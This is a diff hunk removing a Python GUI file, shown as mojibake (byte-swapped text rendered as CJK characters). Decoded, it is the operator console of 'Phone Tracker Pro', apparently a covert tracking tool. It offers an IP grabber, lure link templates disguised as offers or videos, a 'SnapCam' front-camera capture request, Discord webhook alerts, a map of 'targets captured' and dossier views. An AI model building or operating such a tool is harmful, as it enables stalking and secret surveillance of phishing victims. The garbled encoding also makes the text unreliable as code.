@@ -1,1 +1,618 @@
-﻿浩潰瑲挠獵潴瑭楫瑮牥愠⁳瑣੫浩潰瑲猠扵牰捯獥ੳ浩潰瑲琠牨慥楤杮椊灭牯⁴祳ੳ浩潰瑲漠ੳ浩潰瑲朠潬੢浩潰瑲樠潳੮浩潰瑲搠瑡瑥浩੥浩潰瑲琠楫瑮牥慭癰敩੷挊歴献瑥慟灰慥慲据彥潭敤∨慄歲⤢†‣潍敤㩳∠祓瑳浥•猨慴摮牡⥤‬䐢牡≫‬䰢杩瑨ਢ瑣⹫敳彴敤慦汵彴潣潬彲桴浥⡥戢畬≥ ⌠吠敨敭㩳∠汢敵•猨慴摮牡⥤‬朢敲湥Ⱒ∠慤歲戭畬≥ਊ汣獡⁳灁⡰瑣⹫呃⥫਺††敤⁦彟湩瑩彟猨汥⥦਺††††畳数⡲⸩彟湩瑩彟⤨ਊ††††敳晬琮瑩敬∨桐湯⁥牔捡敫⁲牐⁯㕶〮ⴠ䤠瑮汥楬敧据⁥䥕⤢ †††猠汥⹦敧浯瑥祲∨〱〰㡸〰⤢ †††猠汥⹦牧摩损汯浵据湯楦畧敲ㄨ‬敷杩瑨ㄽ਩††††敳晬朮楲彤潲捷湯楦畧敲〨‬敷杩瑨ㄽ਩ †††⌠匠摩扥牡 †††猠汥⹦楳敤慢彲牦浡⁥‽瑣⹫呃䙫慲敭猨汥ⱦ眠摩桴㈽〰‬潣湲牥牟摡畩㵳⤰ †††猠汥⹦楳敤慢彲牦浡⹥牧摩爨睯〽‬潣畬湭〽‬瑳捩祫∽獮睥⤢ †††猠汥⹦楳敤慢彲牦浡⹥牧摩牟睯潣普杩牵⡥ⰶ眠楥桧㵴⤱ਊ††††敳晬氮杯彯慬敢⁬‽瑣⹫呃䱫扡汥猨汥⹦楳敤慢彲牦浡ⱥ琠硥㵴吢慲正牥倠潲Ⱒ映湯㵴瑣⹫呃䙫湯⡴楳敺㈽ⰰ眠楥桧㵴戢汯≤⤩ †††猠汥⹦潬潧江扡汥朮楲⡤潲㵷ⰰ挠汯浵㵮ⰰ瀠摡㵸〲‬慰祤⠽〲‬〱⤩ਊ††††敳晬瀮潨敮江扡汥㴠挠歴䌮歔慌敢⡬敳晬献摩扥牡晟慲敭‬整瑸∽慔杲瑥丠浵敢⁲⬨䍃㨩⤢ †††猠汥⹦桰湯彥慬敢⹬牧摩爨睯ㄽ‬潣畬湭〽‬慰硤㈽ⰰ瀠摡㵹ㄨⰰ〠Ⱙ猠楴正㵹眢⤢ †††猠汥⹦桰湯彥湥牴⁹‽瑣⹫呃䕫瑮祲猨汥⹦楳敤慢彲牦浡ⱥ瀠慬散潨摬牥瑟硥㵴⬢㈱㐳㘵㠷〹⤢ †††猠汥⹦桰湯彥湥牴⹹牧摩爨睯㈽‬潣畬湭〽‬慰硤㈽ⰰ瀠摡㵹〨‬〱Ⱙ猠楴正㵹攢≷਩ †††猠汥⹦景楦散彲慬敢⁬‽瑣⹫呃䱫扡汥猨汥⹦楳敤慢彲牦浡ⱥ琠硥㵴伢晦捩牥⼠圠扥潨歯∺਩††††敳晬漮晦捩牥江扡汥朮楲⡤潲㵷ⰳ挠汯浵㵮ⰰ瀠摡㵸〲‬慰祤⠽〱‬⤰‬瑳捩祫∽≷਩††††敳晬漮晦捩牥敟瑮祲㴠挠歴䌮歔湅牴⡹敳晬献摩扥牡晟慲敭‬汰捡桥汯敤彲整瑸∽偏剅呁剏ㄭ⤢ †††猠汥⹦景楦散彲湥牴⹹牧摩爨睯㐽‬潣畬湭〽‬慰硤㈽ⰰ瀠摡㵹〨‬〱Ⱙ猠楴正㵹攢≷਩ †††猠汥⹦慣敳江扡汥㴠挠歴䌮歔慌敢⡬敳晬献摩扥牡晟慲敭‬整瑸∽慃敳䤠㩄⤢ †††猠汥⹦慣敳江扡汥朮楲⡤潲㵷ⰵ挠汯浵㵮ⰰ瀠摡㵸〲‬慰祤⠽〱‬⤰‬瑳捩祫∽睮⤢ †††猠汥⹦慣敳敟瑮祲㴠挠歴䌮歔湅牴⡹敳晬献摩扥牡晟慲敭‬汰捡桥汯敤彲整瑸∽䅃䕓堭塘≘਩††††敳晬挮獡彥湥牴⹹牧摩爨睯㘽‬潣畬湭〽‬慰硤㈽ⰰ瀠摡㵹〨‬〱Ⱙ猠楴正㵹渢≷਩ †††猠汥⹦牧扡敢彲慶⁲‽瑣⹫潂汯慥噮牡瘨污敵䘽污敳਩††††敳晬朮慲扢牥损敨正潢⁸‽瑣⹫呃䍫敨正潂⡸敳晬献摩扥牡晟慲敭‬整瑸∽湅扡敬䤠⁐片扡敢≲‬慶楲扡敬猽汥⹦牧扡敢彲慶⥲ †††猠汥⹦牧扡敢彲档捥扫硯朮楲⡤潲㵷ⰷ挠汯浵㵮ⰰ瀠摡㵸〲‬慰祤⠽〱‬〱Ⱙ猠楴正㵹眢⤢ਊ††††敳晬焮極正癟牡㴠挠歴䈮潯敬湡慖⡲慶畬㵥慆獬⥥ †††猠汥⹦畱捩彫档捥扫硯㴠挠歴䌮歔桃捥䉫硯猨汥⹦楳敤慢彲牦浡ⱥ琠硥㵴儢極正䴠摯≥‬慶楲扡敬猽汥⹦畱捩彫慶⥲ †††猠汥⹦畱捩彫档捥扫硯朮楲⡤潲㵷ⰸ挠汯浵㵮ⰰ瀠摡㵸〲‬慰祤⠽〱‬〱Ⱙ猠楴正㵹眢⤢ਊ††††敳晬琮浥汰瑡彥慶⁲‽瑣⹫瑓楲杮慖⡲慶畬㵥匢慴摮牡⁤晏敦≲਩††††敳晬琮浥汰瑡彥牤灯潤湷㴠挠歴䌮歔灏楴湯敍畮猨汥⹦楳敤慢彲牦浡ⱥ瘠污敵㵳≛瑓湡慤摲传晦牥Ⱒ∠潙呵扵⁥楖敤≯‬䜢潯汧⁥牄癩≥ⱝ瘠牡慩汢㵥敳晬琮浥汰瑡彥慶⥲ †††猠汥⹦整灭慬整摟潲摰睯⹮牧摩爨睯㤽‬潣畬湭〽‬慰硤㈽ⰰ瀠摡㵹ㄨⰰㄠ⤰‬瑳捩祫∽睥⤢ਊ††††敳晬献慴瑲扟瑵潴⁮‽瑣⹫呃䉫瑵潴⡮敳晬献摩扥牡晟慲敭‬整瑸∽呓剁⁔䍓乁Ⱒ挠浯慭摮猽汥⹦瑳牡彴捳湡‬杦损汯牯∽敲≤‬潨敶彲潣潬㵲搢牡牫摥⤢ †††猠汥⹦瑳牡彴畢瑴湯朮楲⡤潲㵷〱‬潣畬湭〽‬慰硤㈽ⰰ瀠摡㵹〲‬瑳捩祫∽睥⤢ਊ††††敳晬献潴彰畢瑴湯㴠挠歴䌮歔畂瑴湯猨汥⹦楳敤慢彲牦浡ⱥ琠硥㵴匢佔≐‬潣浭湡㵤敳晬献潴彰捳湡‬杦损汯牯∽牧祡Ⱒ猠慴整∽楤慳汢摥⤢ †††猠汥⹦瑳灯扟瑵潴⹮牧摩爨睯ㄽⰱ挠汯浵㵮ⰰ瀠摡㵸〲‬慰祤⠽ⰰ㈠⤰‬瑳捩祫∽睥⤢ਊ††††‣慍湩映慲敭眠瑩⁨慔獢 †††猠汥⹦慴癢敩⁷‽瑣⹫呃呫扡楶睥猨汥⥦ †††猠汥⹦慴癢敩⹷牧摩爨睯〽‬潣畬湭ㄽ‬慰硤㈽ⰰ瀠摡㵹〲‬瑳捩祫∽獮睥⤢ †††ਠ††††敳晬琮扡楶睥愮摤∨慄桳潢牡≤਩††††敳晬琮扡楶睥愮摤∨楌敶䴠灡⤢ †††猠汥⹦慴癢敩⹷摡⡤䌢獡⁥楈瑳牯≹਩††††敳晬琮扡楶睥愮摤∨敓瑴湩獧⤢ਊ††††‣慄桳潢牡⁤慔੢††††敳晬琮扡楶睥琮扡∨慄桳潢牡≤⸩牧摩牟睯潣普杩牵⡥ⰱ眠楥桧㵴⤱ †††猠汥⹦慴癢敩⹷慴⡢䐢獡扨慯摲⤢朮楲彤潣畬湭潣普杩牵⡥ⰰ眠楥桧㵴⤱ †††ਠ††††‣瑓瑡䌠牡獤 †††猠汥⹦瑳瑡彳牦浡⁥‽瑣⹫呃䙫慲敭猨汥⹦慴癢敩⹷慴⡢䐢獡扨慯摲⤢‬杦损汯牯∽牴湡灳牡湥≴਩††††敳晬献慴獴晟慲敭朮楲⡤潲㵷ⰰ挠汯浵㵮ⰰ猠楴正㵹攢≷‬慰硤ㄽⰰ瀠摡㵹⤵ †††猠汥⹦瑳瑡彳牦浡⹥牧摩损汯浵据湯楦畧敲⠨ⰰⰱ⤲‬敷杩瑨ㄽ਩†††† †††猠汥⹦瑳瑡獟慴畴⁳‽瑣⹫呃䱫扡汥猨汥⹦瑳瑡彳牦浡ⱥ琠硥㵴鮟辸匠卙䕔㩍传䙆䥌䕎Ⱒ映湯㵴瑣⹫呃䙫湯⡴敷杩瑨∽潢摬Ⱒ猠穩㵥㐱Ⱙ琠硥彴潣潬㵲朢慲≹਩††††敳晬献慴彴瑳瑡獵朮楲⡤潲㵷ⰰ挠汯浵㵮⤰ †††ਠ††††敳晬献慴彴慴杲瑥⁳‽瑣⹫呃䱫扡汥猨汥⹦瑳瑡彳牦浡ⱥ琠硥㵴躟₯䅔䝒呅⁓䅃呐剕䑅›∰‬潦瑮挽歴䌮歔潆瑮眨楥桧㵴戢汯≤‬楳敺ㄽ⤴‬整瑸损汯牯∽祣湡⤢ †††猠汥⹦瑳瑡瑟牡敧獴朮楲⡤潲㵷ⰰ挠汯浵㵮⤱ †††ਠ††††敳晬献慴彴慬整瑳㴠挠歴䌮歔慌敢⡬敳晬献慴獴晟慲敭‬整瑸∽迢辸䰠呁卅㩔丠䄯Ⱒ映湯㵴瑣⹫呃䙫湯⡴敷杩瑨∽潢摬Ⱒ猠穩㵥㐱Ⱙ琠硥彴潣潬㵲漢慲杮≥਩††††敳晬献慴彴慬整瑳朮楲⡤潲㵷ⰰ挠汯浵㵮⤲ †††ਠ††††敳晬挮湯潳敬瑟硥扴硯㴠挠歴䌮歔敔瑸潢⡸敳晬琮扡楶睥琮扡∨慄桳潢牡≤Ⱙ映湯㵴瑣⹫呃䙫湯⡴慦業祬∽潃獮汯獡Ⱒ猠穩㵥㈱⤩ †††猠汥⹦潣獮汯彥整瑸潢⹸牧摩爨睯ㄽ‬潣畬湭〽‬瑳捩祫∽獮睥Ⱒ瀠摡㵸〱‬慰祤㔽਩††††敳晬挮湯潳敬瑟硥扴硯椮獮牥⡴〢〮Ⱒ∠敗捬浯⁥潴倠潨敮吠慲正牥倠潲瘠⸵尰坮楡楴杮映牯挠浯慭摮⹳⸮湜⤢ †††猠汥⹦潣獮汯彥整瑸潢⹸潣普杩牵⡥瑳瑡㵥搢獩扡敬≤਩ †††猠汥⹦牰杯敲獳㴠挠歴䌮歔牐杯敲獳慂⡲敳晬琮扡楶睥琮扡∨慄桳潢牡≤Ⱙ瀠潲牧獥彳潣潬㵲爢摥⤢ †††猠汥⹦牰杯敲獳朮楲⡤潲㵷ⰲ挠汯浵㵮ⰰ猠楴正㵹攢≷‬慰硤ㄽⰰ瀠摡㵹〨‬〱⤩ †††猠汥⹦牰杯敲獳献瑥〨਩ †††⌠䰠癩⁥慍⁰慔੢††††敳晬琮扡楶睥琮扡∨楌敶䴠灡⤢朮楲彤潲捷湯楦畧敲ㄨ‬敷杩瑨ㄽ਩††††敳晬琮扡楶睥琮扡∨楌敶䴠灡⤢朮楲彤潣畬湭潣普杩牵⡥ⰰ眠楥桧㵴⤱ਊ††††慭彰潣瑮潲獬㴠挠歴䌮歔牆浡⡥敳晬琮扡楶睥琮扡∨楌敶䴠灡⤢‬杦损汯牯∽牴湡灳牡湥≴਩††††慭彰潣瑮潲獬朮楲⡤潲㵷ⰰ挠汯浵㵮ⰰ猠楴正㵹攢≷‬慰硤ㄽⰰ瀠摡㵹⤵ †††猠汥⹦汰瑯慟汬扟湴㴠挠歴䌮歔畂瑴湯洨灡损湯牴汯ⱳ琠硥㵴鞟辸倠潬⁴汁⁬慃敳≳‬楷瑤㵨㔱ⰰ挠浯慭摮猽汥⹦汰瑯慟汬损獡獥‬杦损汯牯∽㈣㐲愴≡਩††††敳晬瀮潬彴污彬瑢⹮慰正猨摩㵥氢晥≴‬慰硤㔽਩††††敳晬挮敬牡浟灡扟湴㴠挠歴䌮歔畂瑴湯洨灡损湯牴汯ⱳ琠硥㵴ꞟ₹汃慥⁲慍≰‬楷瑤㵨㈱ⰰ挠浯慭摮猽汥⹦汣慥彲慭Ɒ映彧潣潬㵲⌢㔵∵਩††††敳晬挮敬牡浟灡扟湴瀮捡⡫楳敤∽敬瑦Ⱒ瀠摡㵸⤵ †††ਠ††††敳晬洮灡睟摩敧⁴‽歴湩整浲灡楶睥吮楫瑮牥慍噰敩⡷敳晬琮扡楶睥琮扡∨楌敶䴠灡⤢‬潣湲牥牟摡畩㵳⤰ †††猠汥⹦慭彰楷杤瑥朮楲⡤潲㵷ⰱ挠汯浵㵮ⰰ猠楴正㵹渢敳≷਩††††敳晬洮灡睟摩敧⹴敳彴楴敬獟牥敶⡲栢瑴獰⼺洯ぴ朮潯汧⹥潣⽭瑶氯特㵳♭汨攽♮㵸硻♽㵹祻♽㵺穻♽㵳慇Ⱒ洠硡穟潯㵭㈲਩††††敳晬洮灡睟摩敧⹴敳彴潰楳楴湯〨‬⤰ †††猠汥⹦慭彰楷杤瑥献瑥穟潯⡭⤲ਊ††††‣慃敳䠠獩潴祲吠扡 †††猠汥⹦慴癢敩⹷慴⡢䌢獡⁥楈瑳牯≹⸩牧摩牟睯潣普杩牵⡥ⰱ眠楥桧㵴⤱ †††猠汥⹦慴癢敩⹷慴⡢䌢獡⁥楈瑳牯≹⸩牧摩损汯浵据湯楦畧敲〨‬敷杩瑨ㄽ਩†††† †††猠汥⹦敲牦獥彨瑢⁮‽瑣⹫呃䉫瑵潴⡮敳晬琮扡楶睥琮扡∨慃敳䠠獩潴祲⤢‬整瑸∽敒牦獥⁨楈瑳牯≹‬潣浭湡㵤敳晬氮慯彤楨瑳牯⥹ †††猠汥⹦敲牦獥彨瑢⹮牧摩爨睯〽‬潣畬湭〽‬慰硤ㄽⰰ瀠摡㵹〱‬瑳捩祫∽≷਩†††† †††猠汥⹦楨瑳牯役牦浡⁥‽瑣⹫呃卫牣汯慬汢䙥慲敭猨汥⹦慴癢敩⹷慴⡢䌢獡⁥楈瑳牯≹⤩ †††猠汥⹦楨瑳牯役牦浡⹥牧摩爨睯ㄽ‬潣畬湭〽‬瑳捩祫∽獮睥Ⱒ瀠摡㵸〱‬慰祤ㄽ⤰ਊ††††‣敓瑴湩獧吠扡 †††猠汥⹦敷桢潯彫慬敢⁬‽瑣⹫呃䱫扡汥猨汥⹦慴癢敩⹷慴⡢匢瑥楴杮≳Ⱙ琠硥㵴䐢獩潣摲圠扥潨歯唠䱒⠠潆⁲偉䜠慲扢牥䄠敬瑲⥳∺‬潦瑮挽歴䌮歔潆瑮眨楥桧㵴戢汯≤⤩ †††猠汥⹦敷桢潯彫慬敢⹬慰正瀨摡㵹㈨ⰰ㔠Ⱙ瀠摡㵸〲‬湡档牯∽≷਩††††敳晬眮扥潨歯敟瑮祲㴠挠歴䌮歔湅牴⡹敳晬琮扡楶睥琮扡∨敓瑴湩獧⤢‬楷瑤㵨〴ⰰ瀠慬散潨摬牥瑟硥㵴栢瑴獰⼺搯獩潣摲挮浯愯楰眯扥潨歯⽳⸮∮਩††††敳晬眮扥潨歯敟瑮祲瀮捡⡫慰祤㔽‬慰硤㈽ⰰ愠据潨㵲眢⤢ †††ਠ††††敳晬献畯摮慟敬瑲癟牡㴠挠歴䈮潯敬湡慖⡲慶畬㵥牔敵਩††††敳晬献畯摮慟敬瑲损⁢‽瑣⹫呃䍫敨正潂⡸敳晬琮扡楶睥琮扡∨敓瑴湩獧⤢‬整瑸∽汐祡匠畯摮漠⁮慔杲瑥䌠灡畴敲Ⱒ瘠牡慩汢㵥敳晬献畯摮慟敬瑲癟牡਩††††敳晬献畯摮慟敬瑲损⹢慰正瀨摡㵹〲‬慰硤㈽ⰰ愠据潨㵲眢⤢ਊ††††敳晬献慮捰浡癟牡㴠挠歴䈮潯敬湡慖⡲慶畬㵥慆獬⥥ †††猠汥⹦湳灡慣彭扣㴠挠歴䌮歔桃捥䉫硯猨汥⹦慴癢敩⹷慴⡢匢瑥楴杮≳Ⱙ琠硥㵴鎟₸湅扡敬匠慮䍰浡⠠敒畱獥⁴牆湯⁴慃敭慲䌠灡畴敲∩‬慶楲扡敬猽汥⹦湳灡慣彭慶Ⱳ琠硥彴潣潬㵲漢慲杮≥਩††††敳晬献慮捰浡损⹢慰正瀨摡㵹〱‬慰硤㈽ⰰ愠据潨㵲眢⤢ਊ††††敳晬琮敨敭癟牡㴠挠歴匮牴湩噧牡瘨污敵∽瑓湡慤摲䜠敲≹਩††††敳晬琮敨敭江扡汥㴠挠歴䌮歔慌敢⡬敳晬琮扡楶睥琮扡∨敓瑴湩獧⤢‬整瑸∽潃獮汯⁥桔浥⁥湅楧敮∺਩††††敳晬琮敨敭江扡汥瀮捡⡫慰祤⠽〲‬⤰‬慰硤㈽ⰰ愠据潨㵲眢⤢ †††猠汥⹦桴浥彥牤灯潤湷㴠挠歴䌮歔灏楴湯敍畮猨汥⹦慴癢敩⹷慴⡢匢瑥楴杮≳Ⱙ瘠污敵㵳≛瑓湡慤摲䜠敲≹‬䴢瑡楲⁸片敥≮‬䌢楲獭湯删摥Ⱒ∠䉆⁉求敵崢‬慶楲扡敬猽汥⹦桴浥彥慶Ⱳ挠浯慭摮猽汥⹦档湡敧瑟敨敭਩††††敳晬琮敨敭摟潲摰睯⹮慰正瀨摡㵹ⰵ瀠摡㵸〲‬湡档牯∽≷਩ †††猠汥⹦牰捯獥⁳‽潎敮 †††猠汥⹦慴杲瑥损畯瑮㴠〠 †††猠汥⹦潬摡桟獩潴祲⤨ਊ††敤⁦潬摡损湯楦⡧敳晬㨩 †††挠湯楦彧慰桴㴠漠⹳慰桴樮楯⡮獯瀮瑡⹨楤湲浡⡥獯瀮瑡⹨扡灳瑡⡨彟楦敬彟⤩‬敳晬挮湯楦彧楦敬਩††††晩漠⹳慰桴攮楸瑳⡳潣普杩灟瑡⥨਺††††††牴㩹 †††††††眠瑩⁨灯湥挨湯楦彧慰桴‬爧⤧愠⁳㩦 †††††††††挠湯楦⁧‽獪湯氮慯⡤⥦ †††††††猠汥⹦桰湯彥湥牴⹹湩敳瑲〨‬潣普杩朮瑥∨桰湯≥‬∢⤩ †††††††猠汥⹦景楦散彲湥牴⹹湩敳瑲〨‬潣普杩朮瑥∨景楦散≲‬∢⤩ †††††††猠汥⹦慣敳敟瑮祲椮獮牥⡴ⰰ挠湯楦⹧敧⡴挢獡彥摩Ⱒ∠⤢਩††††††††敳晬朮慲扢牥癟牡献瑥挨湯楦⹧敧⡴朢慲扢牥Ⱒ䘠污敳⤩ †††††††猠汥⹦畱捩彫慶⹲敳⡴潣普杩朮瑥∨畱捩≫‬慆獬⥥਩††††††††敳晬琮浥汰瑡彥慶⹲敳⡴潣普杩朮瑥∨整灭慬整Ⱒ∠瑓湡慤摲传晦牥⤢਩††††††††敳晬眮扥潨歯敟瑮祲椮獮牥⡴ⰰ挠湯楦⹧敧⡴眢扥潨歯Ⱒ∠⤢਩††††††††敳晬献畯摮慟敬瑲癟牡献瑥挨湯楦⹧敧⡴猢畯摮慟敬瑲Ⱒ吠畲⥥਩††††††††敳晬献慮捰浡癟牡献瑥挨湯楦⹧敧⡴猢慮捰浡Ⱒ䘠污敳⤩ †††††††猠汥⹦桴浥彥慶⹲敳⡴潣普杩朮瑥∨桴浥≥‬匢慴摮牡⁤片祥⤢਩††††††††敳晬挮慨杮彥桴浥⡥敳晬琮敨敭癟牡朮瑥⤨਩††††††††敳晬愮灰湥彤整瑸∨䍛乏䥆嵇匠瑥楴杮⁳潬摡摥映潲⁭楦敬尮≮਩††††††硥散瑰䔠捸灥楴湯愠⁳㩥 †††††††猠汥⹦灡数摮瑟硥⡴≦䍛乏䥆嵇䔠牲牯氠慯楤杮›敻屽≮਩ †搠晥猠癡彥潣普杩猨汥⥦਺††††潣普杩灟瑡⁨‽獯瀮瑡⹨潪湩漨⹳慰桴搮物慮敭漨⹳慰桴愮獢慰桴弨晟汩彥⥟Ⱙ猠汥⹦潣普杩晟汩⥥ †††挠湯楦⁧‽੻††††††瀢潨敮㨢猠汥⹦桰湯彥湥牴⹹敧⡴Ⱙ †††††∠景楦散≲›敳晬漮晦捩牥敟瑮祲朮瑥⤨ਬ††††††挢獡彥摩㨢猠汥⹦慣敳敟瑮祲朮瑥⤨ਬ††††††朢慲扢牥㨢猠汥⹦牧扡敢彲慶⹲敧⡴Ⱙ †††††∠畱捩≫›敳晬焮極正癟牡朮瑥⤨ਬ††††††琢浥汰瑡≥›敳晬琮浥汰瑡彥慶⹲敧⡴Ⱙ †††††∠敷桢潯≫›敳晬眮扥潨歯敟瑮祲朮瑥⤨ਬ††††††猢畯摮慟敬瑲㨢猠汥⹦潳湵彤污牥彴慶⹲敧⡴Ⱙ †††††∠湳灡慣≭›敳晬献慮捰浡癟牡朮瑥⤨ਬ††††††琢敨敭㨢猠汥⹦桴浥彥慶⹲敧⡴਩††††੽††††牴㩹 †††††眠瑩⁨灯湥挨湯楦彧慰桴‬眧⤧愠⁳㩦 †††††††樠潳⹮畤灭挨湯楦Ⱨ映‬湩敤瑮㈽਩††††硥散瑰䔠捸灥楴湯愠⁳㩥 †††††猠汥⹦灡数摮瑟硥⡴≦䍛乏䥆嵇䔠牲牯猠癡湩㩧笠絥湜⤢ਊ††敤⁦档湡敧瑟敨敭猨汥ⱦ挠潨捩⥥਺††††潣潬獲㴠笠匢慴摮牡⁤片祥㨢∠昣晦晦≦‬䴢瑡楲⁸片敥≮›⌢〰晦〰Ⱒ∠牃浩潳⁮敒≤›⌢晦㌳㌳Ⱒ∠䉆⁉求敵㨢∠㌣㤳昹≦੽††††牰杯损汯牯⁳‽≻瑓湡慤摲䜠敲≹›爢摥Ⱒ∠慍牴硩䜠敲湥㨢∠〣愰ち∰‬䌢楲獭湯删摥㨢∠慤歲敲≤‬䘢䥂䈠畬≥›渢癡≹੽††††敳晬挮湯潳敬瑟硥扴硯挮湯楦畧敲琨硥彴潣潬㵲潣潬獲朮瑥挨潨捩ⱥ∠桷瑩≥⤩ †††猠汥⹦牰杯敲獳挮湯楦畧敲瀨潲牧獥彳潣潬㵲牰杯损汯牯⹳敧⡴档楯散‬爢摥⤢਩ਊ††敤⁦灡数摮瑟硥⡴敳晬‬整瑸㨩 †††椠⁦潮⁴獩湩瑳湡散琨硥ⱴ猠牴㨩 †††††琠祲਺††††††††整瑸㴠猠牴琨硥⥴ †††††攠捸灥⁴硅散瑰潩㩮 †††††††琠硥⁴‽嬢湵牰湩慴汢⁥畯灴瑵≝ †††††††ਠ††††‣浓牡⁴畁潴匭牣汯㩬漠汮⁹番灭琠⁯潢瑴浯椠⁦捳潲汬慢⁲獩愠牬慥祤愠⁴潢瑴浯 †††礠楶睥㴠猠汥⹦潣獮汯彥整瑸潢⹸瑟硥扴硯礮楶睥⤨ †††椠彳瑡扟瑯潴⁭‽癹敩孷崱㸠‽⸰㤹 †††††††ਠ††††敳晬挮湯潳敬瑟硥扴硯挮湯楦畧敲猨慴整∽潮浲污⤢ †††猠汥⹦潣獮汯彥整瑸潢⹸湩敳瑲∨湥≤‬整瑸਩††††晩椠彳瑡扟瑯潴㩭 †††††猠汥⹦潣獮汯彥整瑸潢⹸敳⡥攢摮⤢ †††猠汥⹦潣獮汯彥整瑸潢⹸潣普杩牵⡥瑳瑡㵥搢獩扡敬≤਩†††† †††⌠倠潲散獳攠敶瑮⁳潦⁲瑓瑡䌠牡獤 †††椠⁦吢剁䕇⁔䅃呐剕䑅•湩琠硥㩴 †††††猠汥⹦慴杲瑥损畯瑮⬠‽਱††††††敳晬献慴彴慴杲瑥⹳潣普杩牵⡥整瑸昽躟₯䅔䝒呅⁓䅃呐剕䑅›獻汥⹦慴杲瑥损畯瑮≽਩††††††浩潰瑲搠瑡瑥浩੥††††††敳晬献慴彴慬整瑳挮湯楦畧敲琨硥㵴≦迢辸䰠呁卅㩔笠慤整楴敭搮瑡瑥浩⹥潮⡷⸩瑳晲楴敭✨䠥┺㩍匥⤧≽਩†††† †††⌠匠灵牥戠獡捩瀠潲牧獥⁳敨牵獩楴獣 †††椠⁦倢䅈䕓㌠•湩琠硥㩴 †††††猠汥⹦牰杯敲獳献瑥〨㌮਩††††汥晩∠协义≔椠⁮整瑸਺††††††敳晬瀮潲牧獥⹳敳⡴⸰⤶ †††攠楬⁦䜢久剅呁义⁇䕒佐呒≓椠⁮整瑸਺††††††敳晬瀮潲牧獥⹳敳⡴⸰⤹ †††攠楬⁦匢牥敶⁲畲湮湩≧椠⁮整瑸漠⁲挢汯敬瑣潩⁮潣灭敬整•湩琠硥㩴 †††††猠汥⹦牰杯敲獳献瑥ㄨ〮਩††††††敳晬献慴彴瑳瑡獵挮湯楦畧敲琨硥㵴鮟辸匠卙䕔㩍传䱎义≅‬整瑸损汯牯∽〣昰て∰਩ †搠晥瘠敩彷慣敳猨汥ⱦ挠獡彥慰桴㨩 †††椠灭牯⁴獪湯 †††映潲⁭䥐⁌浩潰瑲䤠慭敧 †††ਠ††††牴㩹 †††††猠汥⹦慴癢敩⹷摡⡤䌢獡⁥楖睥牥⤢ †††攠捸灥⁴慖畬䕥牲牯਺††††††慰獳⌠吠扡愠牬慥祤攠楸瑳ੳ†††††† †††猠汥⹦慴癢敩⹷敳⡴䌢獡⁥楖睥牥⤢ †††琠扡㴠猠汥⹦慴癢敩⹷慴⡢䌢獡⁥楖睥牥⤢ †††ਠ††††潦⁲楷杤瑥椠⁮慴⹢楷普彯档汩牤湥⤨਺††††††楷杤瑥搮獥牴祯⤨ †††††ਠ††††捳潲汬晟慲敭㴠挠歴䌮歔捓潲汬扡敬牆浡⡥慴⥢ †††猠牣汯彬牦浡⹥慰正昨汩㵬戢瑯≨‬硥慰摮吽畲ⱥ瀠摡㵸〱‬慰祤ㄽ⤰ †††ਠ††††楴汴⁥‽瑣⹫呃䱫扡汥猨牣汯彬牦浡ⱥ琠硥㵴閟辸传䥓呎䘠剏久䥓⁃佄卓䕉≒‬潦瑮挽歴䌮歔潆瑮猨穩㵥〲‬敷杩瑨∽潢摬⤢‬整瑸损汯牯∽敲≤਩††††楴汴⹥慰正瀨摡㵹〱਩†††† †††琠祲਺††††††楷桴漠数⡮慣敳灟瑡ⱨ✠❲‬湥潣楤杮✽瑵ⵦ✸ 獡映਺††††††††慤慴㴠樠潳⹮潬摡昨਩†††††† †††††挠灡畴敲⁳‽慤慴朮瑥∨慣瑰牵獥Ⱒ嬠⥝ †††††搠獩彫浩条獥㴠猠牯整⡤汧扯朮潬⡢慣敳灟瑡⹨敲汰捡⡥⸢獪湯Ⱒ∠⩟樮杰⤢⤩ਊ††††††敤⁦獟潨彷浩⡧慰敲瑮‬楰彬浩Ⱨ氠扡汥㨩 †††††††琠祲਺††††††††††楰彬浩⹧桴浵湢楡⡬㌨〰‬〳⤰਩††††††††††瑣彫浩⁧‽瑣⹫呃䥫慭敧氨杩瑨楟慭敧瀽汩楟杭‬慤歲楟慭敧瀽汩楟杭‬楳敺瀽汩楟杭献穩⥥ †††††††††氠汢㴠挠歴䌮歔慌敢⡬慰敲瑮‬浩条㵥瑣彫浩Ⱨ琠硥㵴∢਩††††††††††扬⹬牟晥㴠挠歴楟杭 †††††††††氠汢瀮捡⡫慰祤㔽਩††††††††††瑣⹫呃䱫扡汥瀨牡湥ⱴ琠硥㵴慬敢ⱬ琠硥彴潣潬㵲漢慲杮≥‬潦瑮挽歴䌮歔潆瑮眨楥桧㵴戢汯≤⤩瀮捡⡫਩††††††††硥散瑰䔠捸灥楴湯਺††††††††††慰獳ਊ††††††‣湓灡慣⁭浉条੥††††††浩潰瑲朠潬੢††††††浩彧慰瑴牥⁮‽慣敳灟瑡⹨敲汰捡⡥⸢獪湯Ⱒ∠⩟樮杰⤢ †††††椠慭敧⁳‽汧扯朮潬⡢浩彧慰瑴牥⥮ †††††椠⁦浩条獥਺††††††††牴㩹 †††††††††椠杭摟瑡⁡‽浉条⹥灯湥椨慭敧孳ㄭ⥝ †††††††††⌠爠獥穩⁥潴映瑩 †††††††††椠杭摟瑡⹡桴浵湢楡⡬㌨〰‬〳⤰਩††††††††††瑣彫浩⁧‽瑣⹫呃䥫慭敧氨杩瑨楟慭敧椽杭摟瑡ⱡ搠牡彫浩条㵥浩彧慤慴‬楳敺椽杭摟瑡⹡楳敺਩††††††††††浩彧扬⁬‽瑣⹫呃䱫扡汥猨牣汯彬牦浡ⱥ椠慭敧挽歴楟杭‬整瑸∽⤢ †††††††††椠杭江汢瀮捡⡫慰祤ㄽ⤰ †††††††††琠条㴠挠歴䌮歔慌敢⡬捳潲汬晟慲敭‬整瑸∽鿰뢓匠䅎䍐䵁䌠偁啔䕒Ⱒ琠硥彴潣潬㵲漢慲杮≥‬潦瑮挽歴䌮歔潆瑮眨楥桧㵴戢汯≤⤩ †††††††††琠条瀮捡⡫慰祤㔽਩††††††††硥散瑰䔠捸灥楴湯愠⁳㩥 †††††††††瀠獡ੳ†††††† †††††⌠倠牡敳挠灡畴敲ੳ††††††慣瑰牵獥㴠搠瑡⹡敧⡴挢灡畴敲≳‬嵛਩††††††潦⁲Ⱪ挠椠⁮湥浵牥瑡⡥慣瑰牵獥㨩 †††††††挠牡⁤‽瑣⹫呃䙫慲敭猨牣汯彬牦浡⥥ †††††††挠牡⹤慰正昨汩㵬砢Ⱒ瀠摡㵹〱‬慰硤ㄽ⤰ 